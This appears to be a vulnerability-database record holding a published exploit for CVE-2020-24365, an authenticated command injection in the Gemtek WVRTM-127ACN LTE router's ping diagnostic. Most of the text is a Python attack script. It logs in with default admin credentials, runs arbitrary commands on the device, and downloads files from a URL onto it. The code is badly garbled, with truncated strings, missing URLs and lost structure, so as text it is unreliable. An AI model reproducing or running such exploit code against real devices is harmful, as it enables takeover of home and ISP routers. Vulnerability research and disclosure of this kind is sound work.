{
    "text": "vul_name : Gemtek WVRTM-127ACN 01.01.02.141 Command Injection ， vul_cve : CVE-2020-24365 ， vul_poc :  # Exploit Title : Gemtek WVRTM-127ACN 01.01.02.141 - Authenticated Arbitrary Command Injection ，  # Date : 13/09/2020 ，  # Exploit Author : Gabriele Zuddas ，  # Version : 01.01.02.127 , 01.01.02.141 ，  # CVE : CVE-2020-24365 ， Service Provider : Linkem ， Product Name : LTE CPE ， Model ID : WVRTM-127ACN ， Serial ID : GMK170418011089 ， IMEI : XX ， ICCID : XX ， Firmware Version : 01.01.02.141 ， Firmware Creation Date : May 15 13 : 04 : 30 CST 2019 ， Bootrom Version : U-Boot 1.1.3 ， Bootrom Creation Date : Oct 23 2015 - 16 : 03 : 05 ， LTE Support Band : 42 , 43 ， Injecting happens here :  ， sh -c ( ping -4 -c 1 -s 4 -W 1 \"INJECTION\" > /tmp/mon_diag.log 2>&1 ; cmscfg -s -n mon_diag_status -v 0 ) & ， Exploit has been tested on older verions too :  ， Firmware Version : 01.01.02.127 ， Firmware Creation Date : May 23 15 : 34 : 10 CST 2018 ， \" ， class Exploit (  )  :  ， CVE = \"CVE-2020-24365\" ， self.args = args ， self.session = requests.Session (  )  ， s = self.session ， r = s.post ( f\" data={\"user_name\" : self.args.username , \"user_passwd\" : self.args.password} )  ， print ( \" [  !  ] Login failed.\" )  ， exit ( 1 )  ， sid = s.cookies [ \"sid\" ]  ， s.headers = {\"sid\" : sid} ， print ( f\" [  *  ] Login successful !  ( sid={sid} ) \" )  ， self.login (  )  ， with self.session as s :  ， payload = f\" ， r = s.get ( payload )  ， r = s.get ( f\" ， content = str ( r.content , \"utf8\" )  ，  # Attempt to stop the command as some commands tend to get stuck ( if commands stop working check on the web interface )  ， r = s.get ( payload )  ， r = s.get ( f\" ， content = str ( r.content , \"utf8\" )  ，  # TODO : eventually parse content with regex to clean out the output ， c = re.findall ( r\" ( ? <= ping : bad address \\' )  ( . *  )  ( ?=\\' ) \" , content )  ， print ( content )  ， print ( c [ 0 ]  )  ， filename = url.rsplit ( '/' , 1 )  [ -1 ]  ， print ( f\" [  *  ] Attempting download of file '{filename}' from {url} .\" )  ， print ( f\" [  *  ] File saved on {self.args.target}'s /tmp/{filename}.\" )  ， print ( self.exploit ( f\"du -h /tmp/{filename}\" )  ， print ( f\" [  !  ] Failed to download {filename} from {url}\" )  ， print ( self.exploit ( self.args.command )  ， exit (  )  ， self.download_file ( self.args.file )  ， exit (  )  ，  # Create the parser and add arguments ， parser = argparse.ArgumentParser (  )  ， parser.add_argument ( \"-t\" , \"-target\" , dest=\"target\" , default=\"192.168.1.1\" , help=\"Vulnerable target\" )  ， parser.add_argument ( \"-u\" , \"-username\" , dest=\"username\" , default=\"admin\" , help=\"Valid username to use\" )  ， parser.add_argument ( \"-p\" , \"-password\" , dest=\"password\" , default=\"admin\" , help=\"Valid password to use\" )  ， parser.add_argument ( \"-c\" , \"-command\" , dest=\"command\" , default=None , help=\"Command to execute\" )  ， parser.add_argument ( \"-D\" , \"-download-file\" , dest=\"file\" , default=None , help=\"Download file on target's /tmp directory\" )  ， args = parser.parse_args (  )  ，  # Run exploit ， X = Exploit ( args )  ， print ( f\" [  *  ] Exploiting {X.CVE} .\" )  ， X.run (  )  ， parser.print_help ( sys.stderr ) ",
    "time": "2020.11.22"
}